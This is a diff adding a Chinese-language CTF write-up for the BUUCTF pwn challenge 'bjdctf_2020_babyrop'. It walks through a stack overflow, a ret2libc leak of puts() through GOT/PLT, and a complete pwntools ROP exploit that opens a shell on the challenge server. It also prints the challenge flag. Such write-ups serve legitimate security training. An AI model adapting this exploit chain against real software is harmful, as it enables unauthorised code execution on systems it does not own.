@@ -249,6 +249,73 @@ io.interactive()
 
 ------
 
+### [bjdctf_2020_babyrop](https://buuoj.cn/challenges#bjdctf_2020_babyrop)
+
+先`file ./bjdctf_2020_babyrop`查看文件类型再`checksec --file=bjdctf_2020_babyrop`检查一下文件保护情况。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/1.png)
+
+用`IDA Pro 64bit`打开附件`bjdctf_2020_babyrop`，按`F5`反汇编源码并查看主函数，发现`vuln()`函数很可疑。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/2.png)
+
+双击发现`vuln()`函数，发现该函数中有个`buf`变量是`char`型数组，`buf`的长度只有`0x20`，`read()`函数限制输入到`buf`变量的字节数为`0x64`，显然存在栈溢出漏洞。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/3.png)
+
+双击`buf`变量查看其在内存中的虚拟地址信息，构造`payload`时可以先用`0x20`个字节占满`buf`变量，然后再加上`r`的`8`个字节。
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/4.png)
+
+在`Function Window`中并没有找到`system()`函数和`'/bin/sh'`字符串，但是主函数中有`puts()`函数啊！程序执行前，`got`表中存放的还是`plt`表的地址，但是程序执行后，`plt`表中存放的是`got`表的地址，`got`表中存放的是函数的真实地址。因此我们可以用`ELF`来获取`puts()`函数的`plt`表和`got`表地址，进行栈溢出并通过`puts()`函数泄露`puts()`函数在`got`表中的真实地址后，进而判断`libc`的版本，然后我们可以根据`libc`版本中`puts()`函数的偏移地址来计算出`libc`的基址地址，再根据`libc`中的`system()`函数和`'/bin/sh'`字符串的偏移地址来算出函数的真实地址，从而构造`shellcode`拿到`flag`。
+
+在`64`位程序中，函数的前`6`个参数是通过寄存器传递的，分别是`rdi`, `rsi`, `rdx`, `rcx`, `r8`, `r9`(当参数小于`7`时)，所以我们需要用`ROPgadget`找到`pop_rdi`和`pop_ret`的地址。
+
+```python
+ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/5.png)
+
+编写`Python`代码即可得到`flag{aed7af27-c195-4e84-824f-263dc8fb04df}`。
+
+```python
+from pwn import *
+from LibcSearcher import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 28823)
+e = ELF('bjdctf_2020_babyrop')
+puts_plt = e.plt['puts']
+log.success('puts_plt => %s' % hex(puts_plt))
+puts_got = e.got['puts']
+log.success('puts_got => %s' % hex(puts_got))
+main_address = e.symbols['main']
+log.success('main_address => %s' % hex(main_address))
+pop_rdi = 0x400733 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
+payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_address)
+io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
+puts_address = u64(io.recvline().strip(b'\n').ljust(8, b'\x00'))
+log.success('puts_address => %s' % hex(puts_address))
+libc = LibcSearcher('puts', puts_address) # 获取libc版本, libc6_2.23-0ubuntu11_amd64
+libcbase = puts_address - libc.dump('puts') # libc的基址=puts()函数地址-puts()函数偏移地址
+log.success('libcbase_address => %s' % hex(libcbase))
+system_address = libcbase + libc.dump('system') # system()函数的地址=libc的基址+system()函数偏移地址
+log.success('system_address => %s' % hex(system_address))
+bin_sh_address = libcbase + libc.dump('str_bin_sh') # '/bin/sh'的地址=libc的基址+'/bin/sh'偏移地址
+log.success('bin_sh_address => %s' % hex(bin_sh_address))
+pop_ret = 0x4004c9 # ROPgadget --binary ./bjdctf_2020_babyrop --only "pop|ret"
+payload = b'a'*0x20 + b'fuckpwn!' + p64(pop_ret) + p64(pop_rdi) + p64(bin_sh_address) + p64(system_address)
+io.sendlineafter(b'Pull up your sword and tell me u story!\n', payload)
+io.interactive()
+```
+
+![](https://paper.tanyaodan.com/BUUCTF/bjdctf_2020_babyrop/6.png)
+
+------
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
